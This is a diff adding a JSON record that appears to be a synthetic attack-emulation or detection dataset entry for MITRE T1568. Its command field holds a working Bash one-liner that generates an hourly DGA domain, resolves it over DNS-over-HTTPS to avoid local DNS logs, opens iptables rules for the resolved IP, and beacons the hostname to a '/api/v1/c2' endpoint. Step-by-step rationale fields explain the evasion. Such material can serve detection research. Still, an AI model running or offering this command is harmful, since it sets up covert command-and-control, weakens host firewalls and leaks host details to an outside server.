@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(date -u +%Y%m%d%H | md5sum | cut -c1-8).sync-cache.net; ip=$(curl -s \"https://cloudflare-dns.com/dns-query?name=$d&type=A\" -H \"accept: application/dns-json\" | grep -oE \"\\\"data\\\":\\\"[0-9.]+\\\"\" | head -n1 | cut -d\\\" -f4); if [ -n \"$ip\" ]; then port=$(shuf -i 20000-60000 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --connect-timeout 3 \"https://$d:$port/api/v1/c2?node=$(hostname)\"; fi'",
+  "explanation": "Uses DNS-over-HTTPS to resolve a DGA domain, then configures iptables to allow traffic to the resolved IP on a random port and performs an HTTPS beacon. Demonstrates dynamic resolution without local DNS logs.",
+  "rationale_steps": [
+    "Generate DGA domain using hourly seed",
+    "Resolve via DoH (Cloudflare) to avoid local DNS monitoring",
+    "Open iptables rules for the resolved IP and random port",
+    "Beacon to the resolved domain with curl over HTTPS"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-3a73022a",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
